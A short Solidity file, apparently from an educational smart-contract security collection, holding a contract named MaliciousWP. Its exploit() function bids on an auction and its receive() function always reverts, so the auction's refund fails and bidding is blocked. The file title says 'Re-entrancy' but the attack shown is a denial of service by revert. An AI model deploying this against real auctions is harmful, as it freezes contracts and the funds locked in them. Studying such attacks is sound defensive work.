// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IAuction} from './Interfaces/IAuction.sol';

/**
 * @title Re-entrancy
 * @author Dom-Mac <dom@dommac.dev>
 *
 * @notice The goal is to implement an auction where
 *         we store the highest bidder and the amount,
 *         the past bidders should be able reiceve their
 *         ethers back once their bid is overtaken.
 *
 * @notice This contract is used to show how to cause
 *         a denial of service attack on the {Auction}
 *         contract.
 *
 * @notice The DoS attack consists in reverting the
 *         transaction in the receive function, causing
 *         the {Auction} contract, specificly the bid()
 *         function to be stuck forever.
 */
contract MaliciousWP {
  error Powned();

  IAuction public auction;

  constructor(address _auction) {
    auction = IAuction(_auction);
  }

  /**
   * @dev call the bid function of the {Auction} contract
   *      and send msg.value to the {Auction} contract.
   */
  function exploit() public payable {
    auction.bid{value: msg.value}();
  }

  /**
   * @dev revert the transaction
   */
  receive() external payable {
    revert Powned();
  }
}
